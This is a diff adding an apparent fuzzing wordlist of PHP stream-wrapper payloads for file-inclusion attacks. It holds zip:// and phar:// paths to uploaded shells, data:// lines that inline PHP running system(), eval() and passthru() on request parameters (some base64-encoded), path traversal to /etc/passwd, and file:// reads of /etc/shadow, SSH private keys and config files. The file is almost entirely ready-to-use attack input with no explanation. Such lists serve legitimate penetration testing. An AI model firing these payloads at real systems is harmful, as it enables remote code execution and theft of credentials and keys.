@@ -1,0 +1,103 @@
+# Advanced PHP Wrapper Payloads
+# zip://, phar://, data://, compress.zlib://, compress.bzip2://
+
+# ZIP Wrapper Exploitation
+zip://uploads/shell.zip%23shell.php
+zip://uploads/file.zip%23cmd.php
+zip://./uploads/shell.zip%23shell.php
+zip://./uploads/file.jpg%23shell.php
+zip:///var/www/uploads/shell.zip%23cmd.php
+zip:///var/www/html/uploads/file.zip%23payload.php
+zip://./file.jpg%23shell.php
+zip://shell.jpg%23shell.php
+zip://avatar.png%23cmd.php
+zip://document.pdf%23rce.php
+
+# PHAR Wrapper Exploitation
+phar://uploads/shell.phar/shell.txt
+phar://uploads/file.phar/cmd.php
+phar://./uploads/shell.phar/payload.php
+phar://./avatar.jpg/cmd.php
+phar://./file.png/shell.php
+phar:///var/www/uploads/file.phar/rce.php
+phar://shell.jpg/cmd.php
+phar://document.pdf/shell.php
+
+# DATA Wrapper - Inline PHP Execution
+data://text/plain,<?php system('id'); ?>
+data://text/plain,<?php system('whoami'); ?>
+data://text/plain,<?php system('pwd'); ?>
+data://text/plain,<?php system('ls'); ?>
+data://text/plain,<?php system('cat /etc/passwd'); ?>
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain,<?php eval($_POST['code']); ?>
+data://text/plain,<?php passthru($_GET['c']); ?>
+data://text/plain,<?php shell_exec('id'); ?>
+data://text/plain,<?php exec('whoami'); ?>
+
+# DATA Wrapper - Base64 Encoded
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdwd2QnKTsgPz4=
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4=
+
+# compress.zlib:// Wrapper
+compress.zlib://uploads/shell.gz
+compress.zlib://./uploads/file.gz
+compress.zlib:///var/www/uploads/shell.gz
+compress.zlib://../../../../../../etc/passwd
+compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd
+
+# compress.bzip2:// Wrapper
+compress.bzip2://uploads/shell.bz2
+compress.bzip2://./uploads/file.bz2
+compress.bzip2:///var/www/uploads/shell.bz2
+compress.bzip2://../../../../../../etc/passwd
+compress.bzip2://php://filter/convert.base64-encode/resource=/etc/passwd
+
+# Combined wrappers
+compress.zlib://phar://shell.phar/cmd.php
+compress.bzip2://phar://shell.phar/cmd.php
+zip://php://filter/resource=uploads/shell.zip
+
+# glob:// Wrapper (directory listing)
+glob://*
+glob://../*
+glob://../../*
+glob:///etc/*
+glob:///var/www/*
+glob:///tmp/*
+
+# php://temp and php://memory with write
+php://temp/maxmemory:1024
+php://memory
+
+# file:// wrapper  
+file:///etc/passwd
+file:///etc/shadow
+file:///var/www/html/config.php
+file:///home/user/.ssh/id_rsa
+file://C:/windows/win.ini
+file://C:/windows/system32/drivers/etc/hosts
+
+# Wrapper with path traversal
+zip://../../uploads/shell.zip%23shell.php
+phar://../../uploads/shell.phar/cmd.php
+compress.zlib://../../uploads/shell.gz
+compress.bzip2://../../uploads/shell.bz2
+
+# Multiple encoded ZIP paths
+zip://uploads/shell.zip%2523shell.php
+zip://uploads/shell.zip%252523shell.php
+
+# PHAR with different extensions
+phar://shell.gif/cmd.php
+phar://shell.jpeg/cmd.php
+phar://shell.png/cmd.php
+phar://shell.pdf/cmd.php
+phar://shell.zip/cmd.php
